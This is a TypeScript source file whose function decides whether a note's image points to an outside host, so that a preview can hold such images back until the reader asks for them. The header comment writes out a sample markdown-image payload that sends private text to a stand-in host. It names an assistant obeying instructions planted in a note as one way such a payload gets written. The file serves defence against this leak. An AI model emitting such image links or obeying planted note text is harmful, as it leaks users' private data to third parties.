// Whether an image in a note would make the reader's browser call another site.
//
// A note is not always written by the person reading it: a shared-folder
// member, or an assistant following text planted in some note, can write
// `![](https://elsewhere.example/p.png?d=<private text>)`. Loaded on sight,
// that image sends the text to whoever runs that site the moment the note is
// opened, and tells them when and from which address it was read. No share is
// involved, so no approval catches it. The preview therefore shows an external
// image only after the reader asks for it, and names the site first.
//
// "Ours" is the page's own origin and the API's (they differ in development).
// Anything that resolves elsewhere — `https://…`, protocol-relative `//…` —
// is external. A URL that does not parse is treated as external too: when in
// doubt, do not load.

export function externalImageHost(src: string, ownOrigins: readonly string[], base: string): string | null {
  let url: URL;
  try {
    url = new URL(src, base);
  } catch {
    return src;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
  return ownOrigins.includes(url.origin) ? null : url.host;
}
